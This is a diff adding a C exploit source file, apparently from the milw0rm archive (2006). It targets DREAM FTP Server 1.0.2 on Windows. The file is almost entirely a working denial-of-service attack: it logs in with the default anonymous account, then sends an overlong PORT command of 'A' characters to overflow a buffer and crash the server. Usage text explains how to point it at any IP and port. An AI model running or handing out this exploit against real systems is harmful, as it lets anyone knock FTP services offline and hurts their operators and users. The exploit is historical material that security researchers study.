@@ -1,0 +1,112 @@
+/*
+=============================================================
+DREAM FTP Server 1.0.2 (PORT) Denial of Service Exploit
+=============================================================
+Discovered by: InTeL
+*Tested on DREAM FTP v1.02 on Windows XP SP2*
+
+Dream FTP v1.02 also has anonymous logins enabled by default 
+which enables anyone to crash the server at will.
+But if the anonymous logins have been disabled try it with 
+a another user/pass account
+
+Shoutz: bryan@top-notch.ws , Digerati, Erazerz, everyone else u kno who u are
+*/
+
+#include <winsock2.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#pragma comment(lib,"wsock32.lib")
+
+int usage(char *);
+
+
+int usage(char *filename)
+{
+	   printf("Dream FTP v1.02 DoS exploit\r\n");
+	   printf("By InTeL\r\n");
+	   printf("USAGE: %s <IP_Address> <port>\r\n", filename);
+
+	exit(0);
+}
+
+int main(int argc, char *argv[])
+{
+	char evilbuf[40], recvbuf[1028];
+	unsigned short port;
+	struct sockaddr_in saddr;
+	struct hostent *he;
+	WSADATA wsaData;
+	SOCKET sock;
+
+	if(argc != 3)
+		usage(argv[0]);
+
+	port = atoi(argv[2]);	
+	if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
+		printf("Unable to initialize Winsock \n");
+		exit(1);
+	}
+
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
+		printf("Socket Error \n");
+		exit(1);
+	}
+
+	if ((he = gethostbyname(argv[1])) == NULL){  
+		printf("Couldnt Resolve %s \n",argv[1]);
+		exit(1);
+	}
+
+	memset(&saddr, 0, sizeof(saddr));
+	saddr.sin_family = AF_INET;
+	saddr.sin_addr = *((struct in_addr *)he->h_addr);	
+	saddr.sin_port = htons(port);
+
+	if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR){
+		printf("Connect Error \n");
+      	exit(1);
+	}
+
+	for(int i = 0; i<3;i++){
+		memset(recvbuf, 0, sizeof(recvbuf));
+		recv(sock, recvbuf, 1027, 0);
+	}
+	printf("Logging in\r\n");	
+
+	memset(evilbuf, 0,sizeof(evilbuf));
+	strcpy(evilbuf, "USER Anonymous\r\n"); //USER
+	send (sock, evilbuf, strlen(evilbuf), 0);
+   
+	for(i=0;i<4;i++){
+		memset(recvbuf,0,sizeof(recvbuf));
+		recv(sock, recvbuf, 1027, 0);
+   	}
+   
+	memset(evilbuf, 0, sizeof(evilbuf));
+	strcpy(evilbuf, "PASS Anonymous\r\n"); //PASS
+	send (sock, evilbuf, strlen(evilbuf), 0);
+
+	for(i=0; i<3;i++) {
+		memset(recvbuf, 0, sizeof(recvbuf));
+		recv(sock, recvbuf, 1027, 0);
+   	}
+	printf("Building overflow string\r\n");
+
+	memset(evilbuf,0,sizeof(evilbuf));
+	strcpy(evilbuf, "PORT ");  //PORT 
+	for(i = 5;i != 36;i++)
+		evilbuf[i] = 'A';
+   	strcat(evilbuf,"\r\n");
+	
+	send (sock, evilbuf, strlen(evilbuf), 0);  
+   
+	printf("DoS Attack Done\r\n");
+	closesocket(sock);
+
+	return 0;
+}
+
+// milw0rm.com [2006-12-21]
